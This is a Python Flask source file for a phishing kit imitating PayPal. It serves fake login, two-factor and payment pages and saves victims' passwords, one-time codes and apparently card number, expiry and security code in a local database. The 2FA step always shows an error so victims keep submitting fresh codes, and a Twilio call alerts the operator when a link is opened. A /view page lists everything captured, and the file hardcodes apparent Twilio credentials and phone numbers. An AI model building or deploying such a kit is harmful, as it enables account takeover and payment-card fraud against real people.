from flask import Flask, request, render_template, url_for,request, redirect, g
import sqlite3
import os
from twilio.rest import Client



app = Flask(__name__)
# Twilio credentials from your Twilio Console
account_sid = "AC360b92e2df5a7dc6b0effda8605b4b71"
auth_token = "5f5a25c3f1b9a2c4b67755d4974788b9"
twilio_number = "+18646265167 "   # Twilio phone number
notify_number = "+16809556233"  # Your personal number (where calls go)

client = Client(account_sid, auth_token)

DATABASE = 'paypal.db'

def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_connection(exception):
    db = g.pop('db', None)
    if db is not None:
        db.close()

# Create tables if they don’t exist
with app.app_context():
    db = get_db()
    cursor = db.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            reason TEXT,
            amount REAL
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email_phone TEXT,
            password TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS payment_details (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            house_number TEXT,
            mm_yy TEXT,
            code TEXT,
            first_name TEXT,
            last_name TEXT,
            street_address TEXT,
            apt_ste TEXT,
            state TEXT,
            zip_code TEXT,
            phone_number TEXT,
            email TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS codes ( 
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT NOT NULL )
    """)
    db.commit()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/payment')
def payment_page():
    reason = request.args.get('reason', 'No reason provided')
    amount = request.args.get('amount', '0.00')

    # Make a phone call
    call = client.calls.create(
        twiml=f'<Response><Say>Alert! Someone opened your payment link. '
              f'Reason: {reason}, Amount: {amount} US dollars.</Say></Response>',
        from_=twilio_number,
        to=notify_number
    )

    return render_template('payment.html', reason=reason, amount=amount)



@app.route('/login')
def login_page():
    return render_template('login.html')



@app.route('/store_user', methods=['POST'])
def store_user():
    email_phone = request.form.get('email_phone')
    password = request.form.get('password')
    db = get_db()
    db.execute("INSERT INTO users (email_phone, password) VALUES (?, ?)", (email_phone, password))
    db.commit()
    return redirect("/2fa")

@app.route('/2fa')
def two_factor():
    # read query parameter ?error=1
    error = request.args.get("error")
    return render_template("2fa.html", error=error)


@app.route('/store_code', methods=['POST'])
def store_code():
    # join digits into one code
    code = ''.join([request.form.get(f'digit{i}', '') for i in range(6)])
    db = get_db()
    db.execute("INSERT INTO codes (code) VALUES (?)", (code,))
    db.commit()

    # after saving, reload 2FA with error flag
    return redirect(url_for("two_factor", error=1))

@app.route('/store_payment_details', methods=['POST'])
def store_payment_details():
    data = (
        request.form.get('house_number'),
        request.form.get('mm_yy'),
        request.form.get('code'),
        request.form.get('first_name'),
        request.form.get('last_name'),
        request.form.get('street_address'),
        request.form.get('apt_ste'),
        request.form.get('state'),
        request.form.get('zip_code'),
        request.form.get('phone_number'),
        request.form.get('email')
    )
    db = get_db()
    db.execute("""
        INSERT INTO payment_details (house_number, mm_yy, code, first_name, last_name, street_address, apt_ste, state, zip_code, phone_number, email) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, data)
    db.commit()
    return redirect(url_for("notfound"))

@app.route("/notfound")
def notfound():
    return render_template("notfound.html")



@app.route('/view')
def view_data():
    db = get_db()
    payments = db.execute("SELECT * FROM payments").fetchall()
    users = db.execute("SELECT * FROM users").fetchall()
    payment_details = db.execute("SELECT * FROM payment_details").fetchall()
    return render_template('view.html', payments=payments, users=users, payment_details=payment_details)

if __name__ == '__main__': 
    app.run(debug=True)
